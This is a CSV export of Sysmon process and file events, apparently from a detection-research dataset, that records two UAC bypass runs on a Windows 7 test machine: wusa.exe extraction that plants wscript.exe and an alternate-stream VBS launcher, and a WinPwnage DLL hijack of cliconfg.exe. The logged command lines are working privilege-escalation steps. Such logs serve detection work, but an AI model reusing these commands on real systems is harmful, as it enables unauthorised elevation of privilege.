,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,FileName,Keywords,Level,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Accesslist,Accessmask,Additionalinfo,Additionalinfo2,Handleid,Objectname,Objectserver,Objecttype,Operationtype,Properties,Subjectdomainname,Subjectlogonid,Subjectusername,Subjectusersid,Appcorrelationid,Attributeldapdisplayname,Attributesyntaxoid,Attributevalue,Dsname,Dstype,Objectclass,Objectdn,Objectguid,Opcorrelationid,Details,Eventtype,Image,Processguid,Processid,Rulename,Targetobject,Utctime,Membername,Membersid,Privilegelist,Targetdomainname,Targetsid,Targetusername,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Product,Terminalsessionid,User,Accountexpires,Allowedtodelegateto,Computeraccountchange,Displayname,Dnshostname,Homedirectory,Homepath,Logonhours,Newuacvalue,Olduacvalue,Passwordlastset,Primarygroupid,Profilepath,Samaccountname,Scriptpath,Serviceprincipalnames,Sidhistory,Useraccountcontrol,Userparameters,Userprincipalname,Userworkstations,Creationutctime,Targetfilename,Catalog,Category,Guid,Installer,Lspname,String,String2,String3,Bytestotal,Bytestransferred,Bytestransferredfrompeer,Filelength,Filetime,Id,Name,Peer,Transferid,Url,Additionalinfohr,Bandwidthlimit,Hr,Ignorebandwidthlimitsonlan,Peercontextinfo,Peerprotocolflags,Proxy,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Operation,Type,Consumer,Filter,Eventnamespace,Query,Authenticationpackagename,Impersonationlevel,Ipaddress,Ipport,Keylength,Lmpackagename,Logonprocessname,Logontype,Processname,Targetlogonid,Targetusersid,Transmittedservices,Workstationname,Restrictedsidcount,Transactionid,Sidlist,Sourcesid,Sourceusername,Pipename,Elevatedtoken,Restrictedadminmode,Targetlinkedlogonid,Targetoutbounddomainname,Targetoutboundusername,Virtualaccount,Accessreason,Relativetargetname,Sharelocalpath,Sharename,Newthreadid,Startaddress,Startfunction,Startmodule,Taskcontent,Taskname,Schemaversion,State,Packagename,Status,Workstation,Targetinfo,Targetlogonguid,Targetservername,Newprocessid,Newprocessname,Tokenelevationtype,Service,Hash,Archived,Isexecutable,Queryname,Queryresults,Querystatus,Accountname,Imagepath,Servicename,Servicetype,Starttype,Disabledprivilegelist,Enabledprivilegelist
691,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11229,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:21.250263200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\makecab.exe,{365ABB72-95E5-5CD3-0000-00101F720F00},3828,,,2019-05-09 02:52:21.234,,,,,,,"""C:\Windows\System32\makecab.exe"" C:\Windows\System32\wscript.exe C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp ",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Microsoft® Cabinet Maker,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
692,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11231,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:21.265888200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-95E5-5CD3-0000-00108F720F00},3824,,,2019-05-09 02:52:21.234,,,,,,,"""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
693,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11233,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:21.281513200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-95E5-5CD3-0000-001065730F00},2852,,,2019-05-09 02:52:21.234,,,,,,,"""C:\Windows\system32\wusa.exe"" ""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
694,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11235,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:21.297138200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-95E5-5CD3-0000-001033750F00},2364,,,2019-05-09 02:52:21.234,,,,,,,"""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
695,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11237,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:21.594013200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-95E5-5CD3-0000-0010E1890F00},2800,,,2019-05-09 02:52:21.422,,,,,,,"""C:\Windows\system32\wusa.exe""  C:\Users\IEUser\AppData\Local\Temp\oz5ctxorxp4.tmp /extract:C:\Windows /quiet",Microsoft Corporation,C:\Windows\system32\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",High,{365ABB72-94CD-5CD3-0000-0020A43A0100},0x0000000000013aa4,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
696,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11238,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:23.500263200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cmd.exe,{365ABB72-95E7-5CD3-0000-001046950F00},2812,,,2019-05-09 02:52:23.484,,,,,,,"""C:\Windows\system32\cmd.exe""  /C ""echo Dim objShell:Dim oFso:Set oFso = CreateObject(""Scripting.FileSystemObject""):Set objShell = WScript.CreateObject(""WScript.Shell""):command = ""powershell.exe"":objShell.Run command, 0:command = ""C:\Windows\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del C:\Windows\wscript.exe&&del C:\Windows\wscript.exe.manifest"""""""""":objShell.Run command, 0:Set objShell = Nothing > ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
697,Microsoft-Windows-Sysmon/Operational,IEWIN7,,15,11240,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,15,2019-05-09T02:52:23.500263200Z,2,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\system32\cmd.exe,{365ABB72-95E7-5CD3-0000-001046950F00},2812,,,2019-05-09 02:52:23.500,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2018-01-03 01:21:25.726,C:\Users\IEUser\AppData,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unknown,,,,,,,,,,,,
698,Microsoft-Windows-Sysmon/Operational,IEWIN7,,11,11241,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,11,2019-05-09T02:52:23.500263200Z,2,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\system32\cmd.exe,{365ABB72-95E7-5CD3-0000-001046950F00},2812,,,2019-05-09 02:52:23.500,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2018-01-03 01:21:25.726,C:\Users\IEUser\AppData:tghjx5xz2ky.vbs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
699,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,11242,1988,228,sysmon_11_1_15_WScriptBypassUAC.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-09T02:52:23.531513200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cmd.exe,{365ABB72-95E7-5CD3-0000-001004970F00},3784,,,2019-05-09 02:52:23.515,,,,,,,"""C:\Windows\system32\cmd.exe""  /C ""C:\Windows\wscript.exe ""C:\Users\IEUser\AppData:tghjx5xz2ky.vbs""""",Microsoft Corporation,C:\Users\IEUser\AppData\Local\Temp\onedrive\,Windows Command Processor,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163",Medium,{365ABB72-94CD-5CD3-0000-0020DD3A0100},0x0000000000013add,powershell,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{365ABB72-9570-5CD3-0000-00103FC90A00},1900,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
700,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,15705,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-10T13:49:29.586782100Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,,,2019-05-10 13:49:29.586,,,,,,,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,?,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,?,?,"SHA1=ECA93AAAA5039E12D2F0CC3F0C8F5AF8FDB15C71,MD5=E11683E4A1E88666DD5E0331F969E0C6,SHA256=B6B4BD10303797C209C4F3C3FCC863A925A77AE2C38090FB8B3FF1BF9C4DDE84,IMPHASH=F3F3DE6C332CF6049756A5B794EBD0C5",Medium,{365ABB72-79DF-5CD5-0000-002041420100},0x0000000000014241,"""C:\Windows\system32\cmd.exe"" ",C:\Windows\System32\cmd.exe,{365ABB72-7AEA-5CD5-0000-001021480A00},332,?,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
701,Microsoft-Windows-Sysmon/Operational,IEWIN7,,11,15706,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,11,2019-05-10T13:49:29.789907100Z,2,,,,,,,,,,,,,,,,,,,,,,,,,,,c:\python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,,,2019-05-10 13:49:29.789,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2019-05-10 13:49:29.789,C:\Users\IEUser\AppData\Local\Temp\NTWDBLIB.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
702,Microsoft-Windows-Sysmon/Operational,IEWIN7,,11,15707,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,11,2019-05-10T13:49:34.946157100Z,2,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\makecab.exe,{365ABB72-816E-5CD5-0000-0010FEB62300},1700,,,2019-05-10 13:49:34.899,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2019-05-10 13:49:34.899,C:\Users\IEUser\AppData\Local\Temp\suspicious.cab,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
703,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,15708,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-10T13:49:39.930532100Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-8173-5CD5-0000-00102FCD2300},3608,,,2019-05-10 13:49:39.836,,,,,,,"""C:\Windows\System32\wusa.exe"" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32 /quiet",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",Medium,{365ABB72-79DF-5CD5-0000-002041420100},0x0000000000014241,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,C:\Python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
704,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,15709,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-10T13:49:40.164907100Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\wusa.exe,{365ABB72-8174-5CD5-0000-0010ABE62300},2676,,,2019-05-10 13:49:40.008,,,,,,,"""C:\Windows\System32\wusa.exe"" c:\users\ieuser\appdata\local\temp\suspicious.cab /extract:C:\Windows\system32 /quiet",Microsoft Corporation,C:\Windows\system32\,Windows Update Standalone Installer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C",High,{365ABB72-79DF-5CD5-0000-0020F8410100},0x00000000000141f8,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,C:\Python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
705,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,15710,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-10T13:49:45.133657100Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cliconfg.exe,{365ABB72-8179-5CD5-0000-00102CFF2300},1052,,,2019-05-10 13:49:45.039,,,,,,,"""C:\Windows\system32\cliconfg.exe"" ",Microsoft Corporation,C:\Users\IEUser\Downloads\WinPwnage-master\WinPwnage-master\,SQL Client Configuration Utility EXE,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=EC95A168D8C1A63A49CFE69155DE1DFD7E9DEB10,MD5=A864C416E467FFA3DEAE4EFACF58F9D7,SHA256=BE756153F3321DE856329FDF3CB87528333D6041400A25B2EBB1F8276BCA6733,IMPHASH=8AE23C0E23439B8F59A5785B5EFD4855",Medium,{365ABB72-79DF-5CD5-0000-002041420100},0x0000000000014241,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,C:\Python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
706,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,15711,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-05-10T13:49:45.378774200Z,5,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cliconfg.exe,{365ABB72-8179-5CD5-0000-001083182400},880,,,2019-05-10 13:49:45.196,,,,,,,"""C:\Windows\system32\cliconfg.exe"" ",Microsoft Corporation,C:\Windows\system32\,SQL Client Configuration Utility EXE,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=EC95A168D8C1A63A49CFE69155DE1DFD7E9DEB10,MD5=A864C416E467FFA3DEAE4EFACF58F9D7,SHA256=BE756153F3321DE856329FDF3CB87528333D6041400A25B2EBB1F8276BCA6733,IMPHASH=8AE23C0E23439B8F59A5785B5EFD4855",High,{365ABB72-79DF-5CD5-0000-0020F8410100},0x00000000000141f8,python  winpwnage.py -u uac -i 11 -p c:\Users\IEUser\Desktop\hellox86.dll,C:\Python27\python.exe,{365ABB72-8169-5CD5-0000-0010D7982300},3552,Microsoft® Windows® Operating System,1,IEWIN7\IEUser,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
707,Microsoft-Windows-Sysmon/Operational,IEWIN7,,7,15712,1980,1948,sysmon_11_1_7_uacbypass_cliconfg.evtx,0x8000000000000000,4,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,7,2019-05-10T13:49:45.387563300Z,3,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cliconfg.exe,{365ABB72-8179-5CD5-0000-001083182400},880,,,2019-05-10 13:49:45.227,,,,,,,,?,,?,?,"SHA1=AA3BF7118AE8138859FC0EE9202684C6DA22C176,MD5=3F090AA1CAE8B179F93B2064B8609AE2,SHA256=AC1DD32C41F6002BDF2EB564653FF23E069594CE55F9E22093355084EE28A6FD,IMPHASH=10D8CBCC4D9E244D697F1C09224856DC",,,,,,,,?,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\NTWDBLIB.dll,,Unavailable,false,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
